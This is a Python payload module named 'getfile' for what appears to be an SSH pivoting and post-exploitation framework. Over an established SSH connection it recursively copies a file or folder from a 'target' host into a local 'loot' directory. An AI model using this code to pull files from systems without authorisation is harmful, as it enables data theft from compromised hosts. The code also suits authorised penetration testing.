from os.path import join,exists
from os import mkdir
import sys
import asyncio, asyncssh

class ExtStr(type):
    def __str__(self):
        return self.getKey()

class BaboosshExt(object,metaclass=ExtStr):
    @classmethod
    def getModType(cls):
        return "payload"

    @classmethod
    def getKey(cls):
        return "getfile"

    @classmethod
    def descr(cls):
        return "Retrieve file from target"
    
    @classmethod
    def buildParser(cls,parser):
        parser.add_argument('file',help='Path of file to retreive from target')

    @classmethod
    async def run(cls,socket, connection, wspaceFolder, stmt):
        try:
            e = cls(socket,connection, wspaceFolder,stmt)
            await e.start()
        except Exception as e:
            print("Error : "+str(e))
            return False
        return True

    def __init__(self,socket,connection,wspaceFolder,stmt):
        self.socket = socket
        self.connection = connection
        self.wspaceFolder = wspaceFolder
        self.stmt = stmt
    
    async def start(self):
        lootFolder = join(self.wspaceFolder,"loot",str(self.connection.getEndpoint()).replace(':','-'),"")
        if not exists(lootFolder):
            mkdir(lootFolder)
        filepath = getattr(self.stmt,'file',None)
        if filepath is None:
            print("You must specify a path")
            return False
        #TODO check if file or folder
        print("Retreiving file "+filepath+"... ",end="")
        sys.stdout.flush()
        filedest=join(lootFolder,filepath.replace('/','_'))
        try:
            await asyncssh.scp((self.socket,filepath),filedest,recurse=True)
        except Exception as e:
            print("Error "+str(type(e))+": "+str(e))
            return False
        print("Done")
        print("File saved as "+filedest)



